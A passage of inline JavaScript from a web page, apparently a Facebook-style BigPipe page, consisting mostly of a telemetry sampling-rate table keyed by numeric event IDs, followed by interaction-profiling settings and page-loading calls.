                                    sampleRate: 1
                                },
                                "3473463": {
                                    sampleRate: 1
                                },
                                "3473464": {
                                    sampleRate: 1
                                },
                                "3473465": {
                                    sampleRate: 1
                                },
                                "3473471": {
                                    sampleRate: 10000
                                },
                                "3735589": {
                                    sampleRate: 100
                                },
                                "3735590": {
                                    sampleRate: 1000
                                },
                                "3735591": {
                                    sampleRate: 100
                                },
                                "3735592": {
                                    sampleRate: 1000
                                },
                                "3735593": {
                                    sampleRate: 1000
                                },
                                "3735594": {
                                    sampleRate: 1000
                                },
                                "3735595": {
                                    sampleRate: 100
                                },
                                "3735596": {
                                    sampleRate: 1000
                                },
                                "3735597": {
                                    sampleRate: 1000
                                },
                                "3735598": {
                                    sampleRate: 100
                                },
                                "3735599": {
                                    sampleRate: 1000
                                },
                                "3735600": {
                                    sampleRate: 100
                                },
                                "3735601": {
                                    sampleRate: 100
                                },
                                "3735602": {
                                    sampleRate: 10000
                                },
                                "3735603": {
                                    sampleRate: 10000
                                },
                                "3735604": {
                                    sampleRate: 100
                                },
                                "3735605": {
                                    sampleRate: 100
                                },
                                "3735606": {
                                    sampleRate: 1
                                },
                                "3735608": {
                                    sampleRate: 250
                                },
                                "3735609": {
                                    sampleRate: 250
                                },
                                "3735610": {
                                    sampleRate: 250
                                },
                                "3735611": {
                                    sampleRate: 250
                                },
                                "3735612": {
                                    sampleRate: 250
                                },
                                "3735613": {
                                    sampleRate: 250
                                },
                                "3735614": {
                                    sampleRate: 250
                                },
                                "3735615": {
                                    sampleRate: 250
                                },
                                "3735616": {
                                    sampleRate: 250
                                },
                                "3735617": {
                                    sampleRate: 250
                                },
                                "3735618": {
                                    sampleRate: 50
                                },
                                "3735619": {
                                    sampleRate: 50
                                },
                                "3735620": {
                                    sampleRate: 50
                                },
                                "3735621": {
                                    sampleRate: 50
                                },
                                "3735622": {
                                    sampleRate: 50
                                },
                                "3735623": {
                                    sampleRate: 500
                                },
                                "3735624": {
                                    sampleRate: 500
                                },
                                "3735625": {
                                    sampleRate: 1
                                },
                                "3735626": {
                                    sampleRate: 50
                                },
                                "3735627": {
                                    sampleRate: 50
                                },
                                "7733271": {
                                    sampleRate: 1
                                },
                                "7995396": {
                                    sampleRate: 100
                                },
                                "7995398": {
                                    sampleRate: 100
                                },
                                "7995399": {
                                    sampleRate: 100
                                },
                                "7995400": {
                                    sampleRate: 1
                                },
                                "7995401": {
                                    sampleRate: 1
                                },
                                "7995402": {
                                    sampleRate: 1
                                },
                                "7995403": {
                                    sampleRate: 100
                                },
                                "7995404": {
                                    sampleRate: 100
                                },
                                "7995408": {
                                    sampleRate: 100
                                },
                                "7995411": {
                                    sampleRate: 100
                                },
                                "11075606": {
                                    sampleRate: 100
                                },
                                "11075649": {
                                    sampleRate: 1
                                },
                                "11075654": {
                                    sampleRate: 1
                                },
                                "11075666": {
                                    sampleRate: 100
                                },
                                "11075669": {
                                    sampleRate: 1
                                },
                                "11075674": {
                                    sampleRate: 1
                                },
                                "12451850": {
                                    sampleRate: 1
                                },
                                "12451853": {
                                    sampleRate: 10000
                                },
                                "12451854": {
                                    sampleRate: 1
                                },
                                "12451859": {
                                    sampleRate: 1
                                },
                                "12451868": {
                                    sampleRate: 1
                                },
                                "12451869": {
                                    sampleRate: 1
                                },
                                "13238313": {
                                    sampleRate: 100
                                },
                                "13238314": {
                                    sampleRate: 100
                                },
                                "13238353": {
                                    sampleRate: 100
                                },
                                "13238354": {
                                    sampleRate: 100
                                },
                                "13238355": {
                                    sampleRate: 100
                                },
                                "13238356": {
                                    sampleRate: 100
                                },
                                "13238392": {
                                    sampleRate: 100
                                },
                                "14549005": {
                                    sampleRate: 10000
                                },
                                "17825794": {
                                    sampleRate: 250
                                },
                                "19202053": {
                                    sampleRate: 100
                                },
                                "19202071": {
                                    sampleRate: 10
                                },
                                "19202072": {
                                    sampleRate: 10
                                },
                                "22347782": {
                                    sampleRate: 100
                                },
                                "22609921": {
                                    sampleRate: 10000
                                },
                                "22675460": {
                                    sampleRate: 250
                                },
                                "23265284": {
                                    sampleRate: 1
                                },
                                "23265285": {
                                    sampleRate: 1
                                },
                                "23265286": {
                                    sampleRate: 1
                                },
                                "23855105": {
                                    sampleRate: 1
                                },
                                "23855106": {
                                    sampleRate: 1
                                },
                                "23855107": {
                                    sampleRate: 1
                                },
                                "23855108": {
                                    sampleRate: 1
                                },
                                "23855109": {
                                    sampleRate: 1
                                },
                                "23855114": {
                                    sampleRate: 1
                                },
                                "25296897": {
                                    sampleRate: 1
                                },
                                "25296900": {
                                    sampleRate: 10000
                                },
                                "25296901": {
                                    sampleRate: 1
                                },
                                "25296902": {
                                    sampleRate: 1
                                },
                                "25296903": {
                                    sampleRate: 10000
                                },
                                "25296904": {
                                    sampleRate: 10000
                                },
                                "25296905": {
                                    sampleRate: 10000
                                },
                                "25296906": {
                                    sampleRate: 10000
                                },
                                "25493505": {
                                    sampleRate: 10000
                                },
                                "25493506": {
                                    sampleRate: 10000
                                },
                                "25952266": {
                                    sampleRate: 1
                                },
                                "26869761": {
                                    sampleRate: 1
                                },
                                "26869762": {
                                    sampleRate: 1
                                },
                                "26869763": {
                                    sampleRate: 1
                                },
                                "26869764": {
                                    sampleRate: 1
                                },
                                "26869765": {
                                    sampleRate: 1
                                },
                                "26869766": {
                                    sampleRate: 1
                                },
                                "26869767": {
                                    sampleRate: 1
                                },
                                "26869768": {
                                    sampleRate: 1
                                },
                                "26869769": {
                                    sampleRate: 1
                                },
                                "26869770": {
                                    sampleRate: 1
                                },
                                "26869771": {
                                    sampleRate: 1
                                },
                                "27459588": {
                                    sampleRate: 5000
                                },
                                "27459589": {
                                    sampleRate: 1
                                },
                                "27459590": {
                                    sampleRate: 10
                                },
                                "27459591": {
                                    sampleRate: 1
                                },
                                "27787270": {
                                    sampleRate: 100000
                                },
                                "27787271": {
                                    sampleRate: 10000
                                },
                                "27983873": {
                                    sampleRate: 1
                                },
                                "27983874": {
                                    sampleRate: 1
                                },
                                "27983875": {
                                    sampleRate: 1
                                },
                                "27983876": {
                                    sampleRate: 1
                                },
                                "27983877": {
                                    sampleRate: 1
                                },
                                "28770305": {
                                    sampleRate: 1
                                },
                                "29294593": {
                                    sampleRate: 1
                                },
                                "29818881": {
                                    sampleRate: 1
                                },
                                "29818882": {
                                    sampleRate: 1
                                },
                                "29818883": {
                                    sampleRate: 1
                                },
                                "29818884": {
                                    sampleRate: 1
                                },
                                "29949953": {
                                    sampleRate: 1
                                },
                                "29949954": {
                                    sampleRate: 1
                                },
                                "29949955": {
                                    sampleRate: 1
                                },
                                "30408705": {
                                    sampleRate: 1
                                },
                                "30408706": {
                                    sampleRate: 1
                                },
                                "30408707": {
                                    sampleRate: 1
                                },
                                "30408708": {
                                    sampleRate: 1
                                },
                                "30408709": {
                                    sampleRate: 1
                                },
                                "30408710": {
                                    sampleRate: 1
                                },
                                "30408711": {
                                    sampleRate: 1
                                },
                                "30408712": {
                                    sampleRate: 1
                                },
                                "30605313": {
                                    sampleRate: 100
                                },
                                "30605314": {
                                    sampleRate: 100
                                },
                                "30605315": {
                                    sampleRate: 100
                                },
                                "30605316": {
                                    sampleRate: 1
                                },
                                "30605317": {
                                    sampleRate: 1
                                },
                                "30605319": {
                                    sampleRate: 1
                                },
                                "30605320": {
                                    sampleRate: 1
                                },
                                "30605321": {
                                    sampleRate: 1
                                },
                                "30605322": {
                                    sampleRate: 1
                                },
                                "30605323": {
                                    sampleRate: 1
                                },
                                "30605324": {
                                    sampleRate: 1
                                },
                                "30605325": {
                                    sampleRate: 1
                                },
                                "30605326": {
                                    sampleRate: 1
                                },
                                "30605328": {
                                    sampleRate: 1
                                },
                                "30605329": {
                                    sampleRate: 1
                                },
                                "30605330": {
                                    sampleRate: 1
                                },
                                "30605331": {
                                    sampleRate: 1
                                },
                                "30605332": {
                                    sampleRate: 1
                                },
                                "30605333": {
                                    sampleRate: 1
                                },
                                "30605334": {
                                    sampleRate: 1
                                },
                                "30605335": {
                                    sampleRate: 1
                                },
                                "30605336": {
                                    sampleRate: 1
                                },
                                "30605337": {
                                    sampleRate: 1
                                },
                                "30605338": {
                                    sampleRate: 1
                                },
                                "30605339": {
                                    sampleRate: 1
                                },
                                "30605340": {
                                    sampleRate: 1
                                },
                                "30605341": {
                                    sampleRate: 1
                                },
                                "30605342": {
                                    sampleRate: 1
                                },
                                "30605343": {
                                    sampleRate: 1
                                },
                                "30605344": {
                                    sampleRate: 1
                                },
                                "30605345": {
                                    sampleRate: 1
                                },
                                "30605346": {
                                    sampleRate: 1
                                },
                                "30605347": {
                                    sampleRate: 1
                                },
                                "30605348": {
                                    sampleRate: 1
                                },
                                "30605349": {
                                    sampleRate: 1
                                },
                                "30605350": {
                                    sampleRate: 1
                                },
                                "30605351": {
                                    sampleRate: 1
                                },
                                "30605352": {
                                    sampleRate: 1
                                },
                                "30605353": {
                                    sampleRate: 1
                                },
                                "30605354": {
                                    sampleRate: 1
                                },
                                "30605355": {
                                    sampleRate: 1
                                },
                                "30605356": {
                                    sampleRate: 1
                                },
                                "30605357": {
                                    sampleRate: 1
                                },
                                "30605358": {
                                    sampleRate: 1
                                },
                                "30605360": {
                                    sampleRate: 1
                                },
                                "30605361": {
                                    sampleRate: 1
                                },
                                "30605362": {
                                    sampleRate: 1
                                },
                                "30605363": {
                                    sampleRate: 1
                                },
                                "30605364": {
                                    sampleRate: 1
                                },
                                "30605366": {
                                    sampleRate: 1
                                },
                                "30605367": {
                                    sampleRate: 1
                                },
                                "30605368": {
                                    sampleRate: 1
                                },
                                "30605369": {
                                    sampleRate: 1
                                },
                                "30605370": {
                                    sampleRate: 1
                                },
                                "30605371": {
                                    sampleRate: 1
                                },
                                "30605373": {
                                    sampleRate: 1
                                },
                                "30605374": {
                                    sampleRate: 1
                                },
                                "30605375": {
                                    sampleRate: 1
                                },
                                "30605376": {
                                    sampleRate: 1
                                },
                                "30605377": {
                                    sampleRate: 1
                                },
                                "30605378": {
                                    sampleRate: 1
                                },
                                "30605380": {
                                    sampleRate: 1
                                },
                                "30605381": {
                                    sampleRate: 1
                                },
                                "30605382": {
                                    sampleRate: 1
                                },
                                "30605383": {
                                    sampleRate: 1
                                },
                                "30605384": {
                                    sampleRate: 1
                                },
                                "30605385": {
                                    sampleRate: 1
                                },
                                "30605386": {
                                    sampleRate: 1
                                },
                                "30605387": {
                                    sampleRate: 1
                                },
                                "30605388": {
                                    sampleRate: 1
                                },
                                "30605389": {
                                    sampleRate: 1
                                },
                                "30605390": {
                                    sampleRate: 1
                                },
                                "30605391": {
                                    sampleRate: 1
                                },
                                "30605392": {
                                    sampleRate: 1
                                },
                                "32374785": {
                                    sampleRate: 10000
                                },
                                "32702465": {
                                    sampleRate: 1
                                },
                                "33488897": {
                                    sampleRate: 1
                                },
                                "33488898": {
                                    sampleRate: 1
                                },
                                "33488899": {
                                    sampleRate: 1
                                },
                                "33488900": {
                                    sampleRate: 1
                                },
                                "33488901": {
                                    sampleRate: 1800
                                },
                                "33488902": {
                                    sampleRate: 1800
                                },
                                "33488903": {
                                    sampleRate: 1800
                                },
                                "33488904": {
                                    sampleRate: 1
                                },
                                "33488905": {
                                    sampleRate: 1
                                },
                                "33554434": {
                                    sampleRate: 1
                                },
                                "33619969": {
                                    sampleRate: 1
                                },
                                "33751042": {
                                    sampleRate: 1
                                },
                                "33751043": {
                                    sampleRate: 1
                                },
                                "33751044": {
                                    sampleRate: 1
                                },
                                "33751045": {
                                    sampleRate: 1
                                },
                                "33751046": {
                                    sampleRate: 1
                                },
                                "33751047": {
                                    sampleRate: 1
                                },
                                "33751048": {
                                    sampleRate: 1
                                },
                                "33751049": {
                                    sampleRate: 1
                                },
                                "35586050": {
                                    sampleRate: 1000
                                },
                                "35586051": {
                                    sampleRate: 10
                                },
                                "35586052": {
                                    sampleRate: 1000
                                },
                                "35586053": {
                                    sampleRate: 1000
                                },
                                "35651585": {
                                    sampleRate: 1
                                },
                                "35651586": {
                                    sampleRate: 1
                                },
                                "35651587": {
                                    sampleRate: 1
                                },
                                "35651588": {
                                    sampleRate: 1
                                },
                                "35651589": {
                                    sampleRate: 1
                                },
                                "35651590": {
                                    sampleRate: 1
                                },
                                "35651591": {
                                    sampleRate: 1
                                },
                                "35651592": {
                                    sampleRate: 1
                                },
                                "35651593": {
                                    sampleRate: 1
                                },
                                "35651594": {
                                    sampleRate: 1
                                },
                                "35651595": {
                                    sampleRate: 1
                                },
                                "35651596": {
                                    sampleRate: 1
                                },
                                "35651597": {
                                    sampleRate: 1
                                },
                                "35651602": {
                                    sampleRate: 1
                                },
                                "36110337": {
                                    sampleRate: 1
                                },
                                "36110338": {
                                    sampleRate: 1
                                },
                                "36110339": {
                                    sampleRate: 1
                                },
                                "36241413": {
                                    sampleRate: 1
                                },
                                "36241422": {
                                    sampleRate: 1
                                },
                                "36241423": {
                                    sampleRate: 1
                                },
                                "36241434": {
                                    sampleRate: 1
                                },
                                "36306945": {
                                    sampleRate: 1
                                },
                                "36306946": {
                                    sampleRate: 1
                                },
                                "36306948": {
                                    sampleRate: 1
                                },
                                "36306951": {
                                    sampleRate: 1000
                                },
                                "36306952": {
                                    sampleRate: 1
                                },
                                "36306953": {
                                    sampleRate: 1
                                },
                                "36306955": {
                                    sampleRate: 1
                                },
                                "37093377": {
                                    sampleRate: 10000
                                },
                                "37158913": {
                                    sampleRate: 1
                                },
                                "37158914": {
                                    sampleRate: 1
                                },
                                "37158915": {
                                    sampleRate: 1
                                },
                                "37158916": {
                                    sampleRate: 1
                                },
                                "37224449": {
                                    sampleRate: 10000
                                },
                                "37224450": {
                                    sampleRate: 10000
                                },
                                "37224451": {
                                    sampleRate: 10000
                                },
                                "37224452": {
                                    sampleRate: 10000
                                },
                                "37224453": {
                                    sampleRate: 10000
                                },
                                "37224454": {
                                    sampleRate: 10000
                                },
                                "37224455": {
                                    sampleRate: 10000
                                },
                                "37224456": {
                                    sampleRate: 10000
                                },
                                "37224457": {
                                    sampleRate: 10000
                                },
                                "37289985": {
                                    sampleRate: 1
                                },
                                "37289986": {
                                    sampleRate: 1
                                },
                                "37289987": {
                                    sampleRate: 1
                                },
                                "37289988": {
                                    sampleRate: 1
                                },
                                "37289989": {
                                    sampleRate: 1
                                },
                                "37289990": {
                                    sampleRate: 1
                                },
                                "37289991": {
                                    sampleRate: 1
                                },
                                "37289992": {
                                    sampleRate: 1
                                },
                                "37814273": {
                                    sampleRate: 1
                                },
                                "37814274": {
                                    sampleRate: 1
                                },
                                "37814275": {
                                    sampleRate: 1
                                },
                                "38338561": {
                                    sampleRate: 1
                                },
                                "38338562": {
                                    sampleRate: 1
                                },
                                "38338563": {
                                    sampleRate: 1
                                },
                                "38338564": {
                                    sampleRate: 1
                                },
                                "38928385": {
                                    sampleRate: 1
                                },
                                "39976961": {
                                    sampleRate: 1
                                },
                                "39976962": {
                                    sampleRate: 1
                                },
                                "39976964": {
                                    sampleRate: 1
                                },
                                "39976965": {
                                    sampleRate: 1
                                },
                                "39976966": {
                                    sampleRate: 1
                                },
                                "39976967": {
                                    sampleRate: 1
                                },
                                "40108033": {
                                    sampleRate: 1
                                },
                                "40173575": {
                                    sampleRate: 100
                                },
                                "40304641": {
                                    sampleRate: 10000
                                },
                                "40501249": {
                                    sampleRate: 1
                                },
                                "40501250": {
                                    sampleRate: 1
                                },
                                "40501252": {
                                    sampleRate: 1
                                },
                                "40501253": {
                                    sampleRate: 1
                                },
                                "40501254": {
                                    sampleRate: 1
                                },
                                "40828929": {
                                    sampleRate: 1
                                },
                                "40828930": {
                                    sampleRate: 1
                                },
                                "40828931": {
                                    sampleRate: 1
                                },
                                "40828932": {
                                    sampleRate: 1
                                },
                                "40828933": {
                                    sampleRate: 1
                                },
                                "40828934": {
                                    sampleRate: 1
                                },
                                "40828935": {
                                    sampleRate: 1
                                },
                                "40828936": {
                                    sampleRate: 1
                                },
                                "40894465": {
                                    sampleRate: 1
                                },
                                "40894466": {
                                    sampleRate: 1
                                },
                                "40894467": {
                                    sampleRate: 1
                                },
                                "40894468": {
                                    sampleRate: 1
                                },
                                "40894469": {
                                    sampleRate: 1
                                },
                                "40894470": {
                                    sampleRate: 1
                                },
                                "40894471": {
                                    sampleRate: 1
                                },
                                "40894472": {
                                    sampleRate: 1
                                },
                                "40894473": {
                                    sampleRate: 1
                                },
                                "40894474": {
                                    sampleRate: 1
                                },
                                "40894475": {
                                    sampleRate: 1
                                },
                                "40894476": {
                                    sampleRate: 1
                                },
                                "40894477": {
                                    sampleRate: 1
                                },
                                "40894478": {
                                    sampleRate: 1
                                },
                                "40894479": {
                                    sampleRate: 1
                                },
                                "40894480": {
                                    sampleRate: 1
                                },
                                "40894481": {
                                    sampleRate: 1
                                },
                                "40894482": {
                                    sampleRate: 1
                                },
                                "40894483": {
                                    sampleRate: 1
                                },
                                "40894484": {
                                    sampleRate: 1
                                },
                                "40894485": {
                                    sampleRate: 1
                                },
                                "40894486": {
                                    sampleRate: 1
                                },
                                "40894487": {
                                    sampleRate: 1
                                },
                                "40894488": {
                                    sampleRate: 1
                                },
                                "40894489": {
                                    sampleRate: 1
                                },
                                "40894490": {
                                    sampleRate: 1
                                },
                                "40894491": {
                                    sampleRate: 1
                                },
                                "40894492": {
                                    sampleRate: 1
                                },
                                "41484289": {
                                    sampleRate: 2
                                },
                                "41484290": {
                                    sampleRate: 100
                                },
                                "41484291": {
                                    sampleRate: 100
                                },
                                "41484293": {
                                    sampleRate: 100
                                },
                                "41484294": {
                                    sampleRate: 200
                                },
                                "41484295": {
                                    sampleRate: 100
                                },
                                "41484296": {
                                    sampleRate: 100
                                },
                                "41484297": {
                                    sampleRate: 100
                                },
                                "41484298": {
                                    sampleRate: 100
                                },
                                "41484299": {
                                    sampleRate: 100
                                },
                                "41484300": {
                                    sampleRate: 100
                                },
                                "41484301": {
                                    sampleRate: 1
                                },
                                "41484302": {
                                    sampleRate: 100
                                },
                                "41484303": {
                                    sampleRate: 100
                                },
                                "41484304": {
                                    sampleRate: 100
                                },
                                "41484305": {
                                    sampleRate: 100
                                },
                                "41484306": {
                                    sampleRate: 100
                                },
                                "41484307": {
                                    sampleRate: 100
                                },
                                "41484308": {
                                    sampleRate: 100
                                },
                                "41484309": {
                                    sampleRate: 1
                                },
                                "41484310": {
                                    sampleRate: 10
                                },
                                "41484311": {
                                    sampleRate: 1
                                },
                                "41484312": {
                                    sampleRate: 100
                                },
                                "41549825": {
                                    sampleRate: 1
                                },
                                "41811969": {
                                    sampleRate: 1
                                },
                                "41811970": {
                                    sampleRate: 1
                                },
                                "41811971": {
                                    sampleRate: 1
                                },
                                "42532865": {
                                    sampleRate: 1000
                                },
                                "42532866": {
                                    sampleRate: 10000
                                },
                                "42729473": {
                                    sampleRate: 1
                                },
                                "42729474": {
                                    sampleRate: 1
                                },
                                "42729475": {
                                    sampleRate: 1
                                },
                                "42729476": {
                                    sampleRate: 1
                                },
                                "42729477": {
                                    sampleRate: 1
                                },
                                "43974657": {
                                    sampleRate: 1
                                },
                                "44040193": {
                                    sampleRate: 1
                                },
                                "44040194": {
                                    sampleRate: 1
                                },
                                "44040195": {
                                    sampleRate: 1
                                },
                                "44040196": {
                                    sampleRate: 1
                                },
                                "44040197": {
                                    sampleRate: 1
                                },
                                "44040198": {
                                    sampleRate: 1
                                },
                                "44433409": {
                                    sampleRate: 1
                                },
                                "44433410": {
                                    sampleRate: 1
                                },
                                "44433411": {
                                    sampleRate: 1
                                },
                                "44892162": {
                                    sampleRate: 1
                                },
                                "44892163": {
                                    sampleRate: 1
                                },
                                "44892165": {
                                    sampleRate: 5
                                },
                                "44892166": {
                                    sampleRate: 5
                                },
                                "44892167": {
                                    sampleRate: 5
                                },
                                "44957697": {
                                    sampleRate: 100
                                },
                                "44957698": {
                                    sampleRate: 1
                                },
                                "44957699": {
                                    sampleRate: 1
                                },
                                "44957700": {
                                    sampleRate: 100
                                },
                                "44957701": {
                                    sampleRate: 1
                                },
                                "44957702": {
                                    sampleRate: 1
                                },
                                "45023238": {
                                    sampleRate: 10000
                                },
                                "45023239": {
                                    sampleRate: 10000
                                },
                                "45023240": {
                                    sampleRate: 10000
                                },
                                "45088770": {
                                    sampleRate: 1
                                },
                                "45613057": {
                                    sampleRate: 1
                                },
                                "45613058": {
                                    sampleRate: 1
                                },
                                "45613059": {
                                    sampleRate: 1
                                },
                                "45678593": {
                                    sampleRate: 1
                                },
                                "45678594": {
                                    sampleRate: 100
                                },
                                "45678595": {
                                    sampleRate: 1
                                },
                                "45678596": {
                                    sampleRate: 1
                                },
                                "46071809": {
                                    sampleRate: 1
                                },
                                "46071810": {
                                    sampleRate: 1
                                },
                                "46071811": {
                                    sampleRate: 1
                                },
                                "46071812": {
                                    sampleRate: 1
                                },
                                "46596097": {
                                    sampleRate: 1
                                },
                                "46596098": {
                                    sampleRate: 1
                                },
                                "47841281": {
                                    sampleRate: 1
                                },
                                "47841282": {
                                    sampleRate: 1
                                },
                                "47841283": {
                                    sampleRate: 1
                                },
                                "48431105": {
                                    sampleRate: 10000
                                },
                                "48431106": {
                                    sampleRate: 10000
                                },
                                "48496641": {
                                    sampleRate: 10000
                                },
                                "48758785": {
                                    sampleRate: 10000
                                },
                                "48758786": {
                                    sampleRate: 10000
                                },
                                "49283073": {
                                    sampleRate: 1
                                },
                                "49283074": {
                                    sampleRate: 1
                                },
                                "49283075": {
                                    sampleRate: 1
                                },
                                "49479681": {
                                    sampleRate: 1
                                },
                                "49479682": {
                                    sampleRate: 1
                                },
                                "49479683": {
                                    sampleRate: 1
                                },
                                "49479684": {
                                    sampleRate: 1
                                },
                                "50003969": {
                                    sampleRate: 1
                                },
                                "50003970": {
                                    sampleRate: 1
                                },
                                "50003971": {
                                    sampleRate: 1
                                },
                                "50003972": {
                                    sampleRate: 1
                                },
                                "50003973": {
                                    sampleRate: 1
                                },
                                "50003974": {
                                    sampleRate: 1
                                },
                                "50135041": {
                                    sampleRate: 10000
                                },
                                "50135042": {
                                    sampleRate: 1
                                },
                                "50135043": {
                                    sampleRate: 1
                                },
                                "50135044": {
                                    sampleRate: 1
                                },
                                "50135045": {
                                    sampleRate: 1
                                },
                                "50135046": {
                                    sampleRate: 1
                                },
                                "50135047": {
                                    sampleRate: 10000
                                },
                                "50135048": {
                                    sampleRate: 1
                                },
                                "50987009": {
                                    sampleRate: 1
                                },
                                "50987010": {
                                    sampleRate: 1
                                },
                                "52035585": {
                                    sampleRate: 10
                                },
                                "52690945": {
                                    sampleRate: 1000000000
                                },
                                "52690946": {
                                    sampleRate: 1
                                },
                                "52690947": {
                                    sampleRate: 1
                                },
                                "52690948": {
                                    sampleRate: 1
                                },
                                "52690949": {
                                    sampleRate: 1
                                },
                                "52756481": {
                                    sampleRate: 1
                                },
                                "52887553": {
                                    sampleRate: 1
                                },
                                "52887554": {
                                    sampleRate: 1
                                },
                                "52887555": {
                                    sampleRate: 1
                                },
                                "52887556": {
                                    sampleRate: 1
                                },
                                "52887557": {
                                    sampleRate: 1
                                },
                                "52953089": {
                                    sampleRate: 1
                                },
                                "52953090": {
                                    sampleRate: 1
                                },
                                "53018625": {
                                    sampleRate: 1
                                },
                                "53346305": {
                                    sampleRate: 1
                                },
                                "53346306": {
                                    sampleRate: 1
                                },
                                "53542913": {
                                    sampleRate: 1
                                },
                                "53542914": {
                                    sampleRate: 1
                                },
                                "53542915": {
                                    sampleRate: 1
                                },
                                "53542916": {
                                    sampleRate: 1
                                },
                                "53608449": {
                                    sampleRate: 1
                                },
                                "53608450": {
                                    sampleRate: 1
                                },
                                "53608451": {
                                    sampleRate: 1
                                },
                                "53739521": {
                                    sampleRate: 10000
                                },
                                "53805057": {
                                    sampleRate: 10000
                                },
                                "54132737": {
                                    sampleRate: 100
                                },
                                "54198273": {
                                    sampleRate: 100
                                },
                                "54263809": {
                                    sampleRate: 1
                                },
                                "54263810": {
                                    sampleRate: 1
                                },
                                "54263811": {
                                    sampleRate: 1
                                },
                                "54329345": {
                                    sampleRate: 10000
                                },
                                "54525953": {
                                    sampleRate: 2
                                },
                                "54525954": {
                                    sampleRate: 1
                                },
                                "54525955": {
                                    sampleRate: 1
                                },
                                "54525956": {
                                    sampleRate: 1
                                },
                                "54525957": {
                                    sampleRate: 1
                                },
                                "54525958": {
                                    sampleRate: 1
                                },
                                "54525959": {
                                    sampleRate: 1
                                },
                                "54657025": {
                                    sampleRate: 10000
                                },
                                "54657026": {
                                    sampleRate: 10000
                                },
                                "54657027": {
                                    sampleRate: 10000
                                },
                                "54657028": {
                                    sampleRate: 10000
                                },
                                "54657029": {
                                    sampleRate: 10000
                                },
                                "54657030": {
                                    sampleRate: 10000
                                },
                                "54853633": {
                                    sampleRate: 1
                                },
                                "54919169": {
                                    sampleRate: 1
                                },
                                "54919170": {
                                    sampleRate: 1
                                },
                                "54919171": {
                                    sampleRate: 1
                                },
                                "54919172": {
                                    sampleRate: 1
                                },
                                "54919173": {
                                    sampleRate: 1
                                },
                                "54919174": {
                                    sampleRate: 1
                                },
                                "54919175": {
                                    sampleRate: 1
                                },
                                "54919176": {
                                    sampleRate: 1
                                },
                                "54919177": {
                                    sampleRate: 1
                                },
                                "54919178": {
                                    sampleRate: 1
                                },
                                "54919179": {
                                    sampleRate: 1
                                },
                                "54919180": {
                                    sampleRate: 1
                                },
                                "54919181": {
                                    sampleRate: 1
                                },
                                "54919182": {
                                    sampleRate: 1
                                },
                                "54919183": {
                                    sampleRate: 1
                                },
                                "54919184": {
                                    sampleRate: 1
                                },
                                "54919185": {
                                    sampleRate: 1
                                },
                                "54919186": {
                                    sampleRate: 1
                                },
                                "54919187": {
                                    sampleRate: 1
                                },
                                "55181313": {
                                    sampleRate: 1
                                },
                                "55181314": {
                                    sampleRate: 1
                                },
                                "55181315": {
                                    sampleRate: 1
                                },
                                "55181316": {
                                    sampleRate: 1
                                },
                                "55181317": {
                                    sampleRate: 1
                                },
                                "55246849": {
                                    sampleRate: 1000000000
                                },
                                "55312385": {
                                    sampleRate: 1
                                },
                                "55312386": {
                                    sampleRate: 1
                                },
                                "55312387": {
                                    sampleRate: 1
                                },
                                "55312388": {
                                    sampleRate: 1
                                },
                                "55443457": {
                                    sampleRate: 1
                                },
                                "55443458": {
                                    sampleRate: 1
                                },
                                "55443459": {
                                    sampleRate: 1
                                },
                                "55443460": {
                                    sampleRate: 1
                                },
                                "55508993": {
                                    sampleRate: 1
                                },
                                "55574529": {
                                    sampleRate: 1
                                },
                                "55836673": {
                                    sampleRate: 1000000000
                                },
                                "55836674": {
                                    sampleRate: 1000000000
                                },
                                "55967745": {
                                    sampleRate: 1
                                },
                                "56360961": {
                                    sampleRate: 1000000000
                                },
                                "56754177": {
                                    sampleRate: 10000
                                },
                                "56754178": {
                                    sampleRate: 10000
                                },
                                "56754179": {
                                    sampleRate: 10000
                                },
                                "56754180": {
                                    sampleRate: 10000
                                },
                                "56754181": {
                                    sampleRate: 1000000
                                }
                            },
                            killswitch: false
                        }, 3504], ["MPageControllerGating", [], {
                            shouldDeferUntilCertainNoRedirect: false,
                            shouldReleaseFetcherLock: false,
                            shouldLoadingScreenSetScriptPath: false,
                            shouldRenderAsync404: false
                        }, 2023], ["TimeSliceInteractionSV", [], {
                            on_demand_reference_counting: true,
                            on_demand_profiling_counters: true,
                            default_rate: 1000,
                            lite_default_rate: 100,
                            interaction_to_lite_coinflip: {
                                ADS_INTERFACES_INTERACTION: 0,
                                ads_perf_scenario: 0,
                                ads_wait_time: 0,
                                Event: 10,
                                video_psr: 0,
                                video_stall: 0
                            },
                            interaction_to_coinflip: {
                                ADS_INTERFACES_INTERACTION: 1,
                                ads_perf_scenario: 1,
                                ads_wait_time: 1,
                                video_psr: 1000000,
                                video_stall: 2500000,
                                Event: 500,
                                cms_editor: 1,
                                pixelcloud_view_performance: 25,
                                intern_notify_inbox_page_load: 10,
                                intern_notify_jewel_list_load: 10,
                                tasks_initial_page_load: 1,
                                watch_carousel_left_scroll: 1,
                                watch_carousel_right_scroll: 1,
                                watch_sections_load_more: 1,
                                watch_discover_scroll: 1,
                                fbpkg_ui: 1,
                                sevmanager_powersearch_initial_page_load: 10,
                                network_ui: 1,
                                daiquery_interactive_query: 1
                            },
                            enable_heartbeat: true,
                            maxBlockMergeDuration: 0,
                            maxBlockMergeDistance: 0,
                            enable_banzai_stream: true,
                            user_timing_coinflip: 50,
                            banzai_stream_coinflip: 1,
                            compression_enabled: true,
                            ref_counting_fix: false,
                            ref_counting_cont_fix: false,
                            also_record_new_timeslice_format: false,
                            force_async_request_tracing_on: false
                        }, 2609], ["cr:694370", ["requestIdleCallbackBlue"], {
                            __rc: ["requestIdleCallbackBlue", "Aa1cKNJ5KDe29Wca-ihHSd1ViFsVzYiH18VNJxLtJaY46zoTCMiv1ntWZ5P7Phboehz-jhgmt7qAXG7v3LdOFWA"]
                        }, -1], ["cr:682175", [], {
                            __rc: [null, "Aa2clZTvfGi3pG98SmPdcAEzqNNg3L3P1Oat0LrIAyqcISV_kIE3RPLrSSyK2d965LbFvQ"]
                        }, -1], ["cr:1367102", [], {
                            __rc: [null, "Aa17Nn2aAJ4uqUd_YYhFAGVKgdGOT-X9vsw9BUxtkiymdJuMjFVx5C-u00ueDVRei16gOOj4BYNj-K8ME0ti"]
                        }, -1]]
                    },
                    last_in_phase: true,
                    tti_phase: 0,
                    all_phases: [63]
                });
            }
            ), "onPageletArrive first_response", {
                "root": true,
                "pagelet": "first_response"
            })();
        </script>
        <script>
            bigPipe.setPageID("6812558644291207214-0");
            CavalryLogger.setPageID("6812558644291207214-0");
        </script>
        <script>
            bigPipe.beforePageletArrive("last_response")
        </script>
        <script>
            require("TimeSlice").guard((function() {
                bigPipe.onPageletArrive({
                    resource_map: {
                        FEt5G: {
